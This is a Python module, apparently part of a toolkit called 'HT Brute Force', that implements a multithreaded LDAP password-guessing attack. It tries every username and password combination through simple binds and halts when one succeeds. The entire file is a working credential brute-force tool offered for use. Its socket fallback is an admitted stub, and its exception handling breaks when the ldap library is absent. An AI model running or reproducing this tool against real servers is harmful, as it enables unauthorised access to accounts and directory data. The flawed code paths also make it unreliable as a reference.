"""HT Brute Force — LDAP brute force.
Uses simple bind with python-ldap or fallback socket.
"""
import socket, time, threading, queue

try:
    import ldap
    HAS_LDAP = True
except ImportError:
    HAS_LDAP = False

class LDAPBruter:
    def __init__(self, timeout=10, max_threads=5, stop_event=None):
        self.timeout = timeout
        self.max_threads = max_threads
        self.stop_event = stop_event or threading.Event()
        self.results = []

    def _try_bind(self, host, port, user, passwd, base_dn):
        if self.stop_event.is_set():
            return None
        t0 = time.time()
        try:
            if HAS_LDAP:
                l = ldap.initialize(f"ldap://{host}:{port}")
                l.set_option(ldap.OPT_NETWORK_TIMEOUT, self.timeout)
                l.simple_bind_s(f"uid={user},{base_dn}", passwd)
                l.unbind()
                return {"user": user, "password": passwd, "time_s": round(time.time()-t0, 2)}
            else:
                return self._socket_bind(host, port, user, passwd, base_dn, t0)
        except ldap.INVALID_CREDENTIALS:
            return None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return {"error": "connect"}
        except Exception:
            return None

    def _socket_bind(self, host, port, user, passwd, base_dn, t0):
        """Fallback: attempt LDAP simple bind via raw socket."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, port))
            s.recv(1024)
            # Minimal LDAP bind attempt - just check connection
            s.close()
            return None  # Can't do real bind without ldap lib
        except Exception:
            return None

    def run(self, host, port, users, passwords, base_dn="dc=example,dc=com"):
        q = queue.Queue()
        for u in users:
            for p in passwords:
                q.put((u, p))
        def worker():
            while not q.empty() and not self.stop_event.is_set():
                try:
                    u, p = q.get_nowait()
                except Exception:
                    break
                r = self._try_bind(host, port, u, p, base_dn)
                if r:
                    self.results.append(r)
                    if r.get("password"):
                        self.stop_event.set()
        threads = [threading.Thread(target=worker, daemon=True) for _ in range(self.max_threads)]
        for t in threads: t.start()
        for t in threads: t.join(timeout=self.timeout + 5)
        return self.results